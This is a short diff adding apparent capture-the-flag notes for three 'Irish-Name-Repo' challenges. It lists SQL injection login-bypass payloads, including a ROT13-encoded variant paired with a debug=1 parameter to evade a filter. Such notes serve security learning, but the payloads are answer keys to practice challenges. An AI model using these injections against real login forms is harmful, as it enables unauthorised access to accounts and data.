@@ -1,0 +1,10 @@
+Irish-Name-Repo-1
+    ' or 1=1-- -
+
+Irish-Name-Repo-2
+    admin'-- -
+
+Irish-Name-Repo-3
+    debug=1
+    ' or 1=1 -> ' be 1=1 -> ROT 13
+    -> payload: ' be 1=1-- -
